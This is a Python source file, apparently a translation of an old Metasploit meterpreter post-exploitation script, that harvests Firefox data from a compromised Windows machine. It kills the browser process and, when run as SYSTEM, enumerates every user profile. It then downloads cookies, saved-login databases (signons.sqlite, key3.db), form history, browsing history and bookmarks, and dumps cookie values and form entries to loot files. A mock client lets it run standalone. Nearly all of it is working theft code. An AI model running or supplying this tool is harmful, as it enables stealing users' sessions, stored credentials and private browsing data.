#!/usr/bin/env python3

#
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
#

# Author: Carlos Perez at carlos_perez[at]darkoperator.com
# Python translation: Your Name/Handle

import argparse
import os
import sqlite3
from datetime import datetime

# This script assumes a 'client' object is available, representing the Meterpreter session.
# All framework, sys, and fs calls are performed through this object.

# ================== Mock Client for Standalone Testing ==================
class MockRegistry:
    def enum_key(self, key):
        if key == "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall":
            return ["Mozilla Firefox 100.0 (x64 en-US)"]
        if key == "HKU":
            return [".DEFAULT", "S-1-5-21-123-456-789-1001", "S-1-5-18"]
        return []
    def query_value(self, key_path, value_name):
        class MockValue:
            def __init__(self, data):
                self.data = data
        if "Volatile Environment" in key_path:
            if value_name == "USERNAME":
                return MockValue("testuser")
            if value_name == "APPDATA":
                return MockValue("C:\\Users\\testuser\\AppData\\Roaming")
        return MockValue("")

class MockFile:
    def __init__(self, path):
        self._path = path
    def stat(self):
        class MockStat:
            def __init__(self, path):
                self.path = path
            def is_directory(self):
                # a simple mock stat that says everything is a file unless it has no extension
                return '.' not in os.path.basename(self.path)
        return MockStat(self._path)
    def download_file(self, dst, src):
        print(f"[*] Downloading {src} to {dst}")
        # create dummy files for sqlite to open
        open(dst, 'a').close()

class MockFs:
    def __init__(self):
        self.file = self
    def foreach(self, path):
        if "Profiles" in path:
            return ["xyz.default", "."]
        if "xyz.default" in path:
            return ["places.sqlite", "cookies.sqlite", "formhistory.sqlite", "search.sqlite", "key3.db", "signons.sqlite", "cert8.db", "."]
        return []
    def __getattr__(self, name):
        return lambda *args, **kwargs: MockFile(args[0] if args else "")

class MockProcess:
    def get_processes(self):
        return [{'name': 'firefox.exe', 'pid': 1234}]
    def kill(self, pid):
        print(f"[*] Killing process {pid}")

class MockClient:
    def __init__(self):
        self.platform = 'windows'
        self.sys = self
        self.config = self
        self.fs = MockFs()
        self.dir = self.fs
        self.registry = MockRegistry()
        self.process = MockProcess()
        self.session_host = "127.0.0.1"
    def getuid(self):
        return "NT AUTHORITY\\SYSTEM"
    def getenvs(self, *args):
        return {'USERNAME': 'currentuser', 'APPDATA': 'C:\\Users\\currentuser\\AppData\\Roaming'}
    def is_system(self):
        return "system" in self.getuid().lower()

# ================== Helper Functions ==================
def print_status(msg):
    print(f"[*] {msg}")

def print_error(msg):
    print(f"[-] {msg}")

def file_local_write(file_path, data):
    with open(file_path, "a", encoding='utf-8') as f:
        f.write(data)

def check_firefox_installed(client):
    """Checks the registry to see if Firefox is installed."""
    print_status("Checking for Firefox installation...")
    try:
        uninstall_key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
        for subkey in client.sys.registry.enum_key(uninstall_key):
            if "firefox" in subkey.lower():
                print_status("Firefox was found on this system.")
                return True
    except Exception as e:
        print_error(f"Could not check for Firefox installation: {e}")
    return False

def kill_firefox(client):
    """Finds and kills any running firefox.exe processes."""
    print_status("Killing the Firefox Process if open...")
    try:
        for p in client.sys.process.get_processes():
            if p['name'].lower() == "firefox.exe":
                print_status(f"\tFirefox Process found: {p['name']} ({p['pid']})")
                print_status("\tKilling process...")
                client.sys.process.kill(p['pid'])
    except Exception as e:
        print_error(f"Failed to kill Firefox: {e}")

def download_firefox_files(client, profile_path, username, log_dir):
    """Recursively search for and download Firefox database files."""
    files_to_get = [
        "formhistory.sqlite", "cookies.sqlite", "places.sqlite",
        "search.sqlite", "cert8.db", "signons.sqlite",
        "signons3.txt", "key3.db"
    ]
    print_status(f"Searching for files in {profile_path}")
    try:
        for item in client.fs.dir.foreach(profile_path):
            if item in ['.', '..']:
                continue

            full_path = f"{profile_path}\\{item}"

            if client.fs.file.stat(full_path).is_directory():
                download_firefox_files(client, full_path, username, log_dir)
            elif item in files_to_get:
                dst = os.path.join(log_dir, f"{username}_{item}")
                print_status(f"\tDownloading Firefox file {item} to '{dst}'")
                try:
                    client.fs.file.download_file(dst, full_path)
                except Exception as e:
                    print_error(f"\t******Failed to download file {item}: {e}******")
                    print_error("\t******Browser could be running******")

    except Exception as e:
        print_error(f"Could not access profile path {profile_path}: {e}")

def process_firefox_databases(username, log_dir):
    """Opens downloaded SQLite DBs and extracts data."""
    print_status(f"Processing downloaded databases for user {username}")

    places_db_path = os.path.join(log_dir, f"{username}_places.sqlite")
    form_db_path = os.path.join(log_dir, f"{username}_formhistory.sqlite")
    search_db_path = os.path.join(log_dir, f"{username}_search.sqlite")
    cookies_db_path = os.path.join(log_dir, f"{username}_cookies.sqlite")

    if os.path.exists(places_db_path):
        try:
            conn = sqlite3.connect(places_db_path)
            cursor = conn.cursor()
            # History
            history = cursor.execute("SELECT DISTINCT url FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id AND visit_type = 1 ORDER BY visit_date").fetchall()
            if history:
                file_local_write(os.path.join(log_dir, f"{username}_history.txt"), "\n".join([row[0] for row in history]))
            # Downloads
            downloads = cursor.execute("SELECT url FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id AND visit_type = 7 ORDER BY visit_date").fetchall()
            if downloads:
                file_local_write(os.path.join(log_dir, f"{username}_download_list.txt"), "\n".join([row[0] for row in downloads]))
            # Bookmarks
            bookmarks = cursor.execute("SELECT a.url FROM moz_places a, moz_bookmarks b WHERE a.id=b.fk").fetchall()
            if bookmarks:
                file_local_write(os.path.join(log_dir, f"{username}_bookmarks.txt"), "\n".join([row[0] for row in bookmarks]))
            conn.close()
        except Exception as e:
            print_error(f"Could not process {places_db_path}: {e}")

    if os.path.exists(form_db_path):
        try:
            conn = sqlite3.connect(form_db_path)
            cursor = conn.cursor()
            forms = cursor.execute("SELECT fieldname, value FROM moz_formhistory").fetchall()
            if forms:
                form_data = "\n".join([f"Field: {row[0]} Value: {row[1]}" for row in forms])
                file_local_write(os.path.join(log_dir, f"{username}_form_history.txt"), form_data)
            conn.close()
        except Exception as e:
            print_error(f"Could not process {form_db_path}: {e}")

    if os.path.exists(search_db_path):
        try:
            conn = sqlite3.connect(search_db_path)
            cursor = conn.cursor()
            searches = cursor.execute("SELECT name, value FROM engine_data").fetchall()
            if searches:
                search_data = "\n".join([f"Field: {row[0]} Value: {row[1]}" for row in searches])
                file_local_write(os.path.join(log_dir, f"{username}_search_history.txt"), search_data)
            conn.close()
        except Exception as e:
            print_error(f"Could not process {search_db_path}: {e}")

    if os.path.exists(cookies_db_path):
        try:
            cookie_dir = os.path.join(log_dir, f"firefox_cookies_{username}")
            os.makedirs(cookie_dir, exist_ok=True)
            conn = sqlite3.connect(cookies_db_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cookies = cursor.execute("SELECT * FROM moz_cookies").fetchall()
            for cookie in cookies:
                cookie_file = os.path.join(cookie_dir, f"{cookie['id']}_{cookie['host']}.txt")
                cookie_data = f"Name: {cookie['name']}\nValue: {cookie['value']}\nHost: {cookie['host']}\nPath: {cookie['path']}\n"
                file_local_write(cookie_file, cookie_data)
            conn.close()
        except Exception as e:
            print_error(f"Could not process {cookies_db_path}: {e}")

# ================== Main Logic ==================
def main():
    parser = argparse.ArgumentParser(description="Extracts Firefox browser data.")
    parser.add_argument("-k", "--kill", action="store_true", help="Kill Firefox processes before enumeration.")
    args = parser.parse_args()

    if client.platform != 'windows':
        print_error("This script only runs on Windows platforms!")
        return

    if not check_firefox_installed(client):
        print_error("Firefox does not appear to be installed.")
        return

    if args.kill:
        kill_firefox(client)

    timestamp = datetime.now().strftime("%Y%m%d.%H%M%S")
    log_base_dir = os.path.join(os.path.expanduser("~"), ".msf4", "logs", "scripts", "enum_firefox")
    log_dir = os.path.join(log_base_dir, f"{client.session_host}{timestamp}")
    os.makedirs(log_dir, exist_ok=True)

    print_status(f"Log files will be saved in: {log_dir}")

    if client.is_system():
        print_status("Running as SYSTEM, enumerating all user profiles...")
        try:
            for sid in client.sys.registry.enum_key("HKU"):
                if sid.startswith("S-1-5-21-") and sid.count('-') > 3:
                    try:
                        key_base = f"HKU\\{sid}"
                        username = client.sys.registry.query_value(f"{key_base}\\Volatile Environment", "USERNAME").data
                        appdata = client.sys.registry.query_value(f"{key_base}\\Volatile Environment", "APPDATA").data

                        if username and appdata:
                            profile_path = f"{appdata}\\Mozilla\\Firefox\\Profiles"
                            print_status(f"Found user '{username}', checking path: {profile_path}")
                            download_firefox_files(client, profile_path, username, log_dir)
                            process_firefox_databases(username, log_dir)
                    except Exception:
                        continue
        except Exception as e:
            print_error(f"Could not enumerate user hives: {e}")
    else:
        print_status("Running as user, enumerating current user profile...")
        try:
            envs = client.sys.config.getenvs('USERNAME', 'APPDATA')
            username = envs['USERNAME']
            appdata = envs['APPDATA']
            profile_path = f"{appdata}\\Mozilla\\Firefox\\Profiles"
            print_status(f"Found user '{username}', checking path: {profile_path}")
            download_firefox_files(client, profile_path, username, log_dir)
            process_firefox_databases(username, log_dir)
        except Exception as e:
            print_error(f"Could not get user profile data: {e}")

    print_status("Firefox enumeration complete.")

if __name__ == "__main__":
    if 'client' not in globals():
        print_status("This script is intended to run in a Meterpreter session.")
        print_status("Initializing a mock client for testing purposes.")
        client = MockClient()
        main()
    else:
        main()